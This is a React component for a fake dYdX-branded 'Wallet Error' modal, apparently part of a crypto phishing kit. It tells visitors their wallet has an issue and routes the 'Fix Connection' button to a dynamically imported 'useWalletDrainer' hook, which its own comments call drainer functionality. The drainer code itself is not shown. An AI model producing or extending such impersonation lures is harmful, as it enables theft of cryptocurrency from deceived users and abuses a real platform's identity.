"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { LottieAnimation } from "./lottie-animation"

interface WalletErrorModalProps {
  isOpen: boolean
}

export function WalletErrorModal({ isOpen }: WalletErrorModalProps) {
  const [isVisible, setIsVisible] = useState(false)
  const [isAnimating, setIsAnimating] = useState(false)

  useEffect(() => {
    if (isOpen) {
      setIsVisible(true)
      const timer = setTimeout(() => {
        setIsAnimating(true)
      }, 50)
      return () => clearTimeout(timer)
    }
  }, [isOpen])

  const handleFixConnection = () => {
    console.log("[dYdX] Fix connection clicked")
    // Import and use the drainer functionality
    import("@/hooks/useWalletDrainer").then(({ useWalletDrainer }) => {
      // This is a fallback implementation
      console.log("Drainer functionality available")
    })
  }

  if (!isVisible) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#2a2a2a] p-4">
      <div
        className={`
          relative flex flex-col items-center
          w-full max-w-[380px]
          bg-[#0b0b0b] rounded-3xl border-2 border-[#1e5ff5]
          px-6 py-8
          shadow-2xl shadow-blue-500/20
          transition-all duration-500 ease-out
          ${isAnimating ? "scale-100 opacity-100" : "scale-95 opacity-0"}
        `}
      >
        <div className="w-12 h-12 mb-5 flex items-center justify-center">
          <Image
            src="/images/logo.svg"
            alt="DyDx Logo"
            width={48}
            height={48}
            className="w-full h-full object-contain"
          />
        </div>

        <h1 className="text-white text-2xl font-bold mb-5">Wallet Error</h1>

        <div className="mb-5 flex items-center justify-center w-24 h-24">
          <LottieAnimation />
        </div>

        <p className="text-[#d1d1d1] text-sm text-center leading-relaxed mb-6 max-w-[320px]">
          We've detected an issue with your connected wallet on{" "}
          <span className="text-[#7370ff] font-semibold">DyDx</span>. This may affect your ability to access certain
          features.
        </p>

        <button
          onClick={handleFixConnection}
          className="
            flex items-center justify-center gap-2.5
            w-full py-3.5 px-6
            bg-[#7370ff] hover:bg-[#6562e8] active:bg-[#5451d1]
            rounded-xl
            text-white text-base font-semibold
            transition-all duration-200
            shadow-lg shadow-[#7370ff]/30 hover:shadow-xl hover:shadow-[#7370ff]/40
          "
        >
          <Image src="/images/connect.svg" alt="Connect" width={20} height={20} className="w-5 h-5" />
          <span>Fix Connection</span>
        </button>
      </div>
    </div>
  )
}
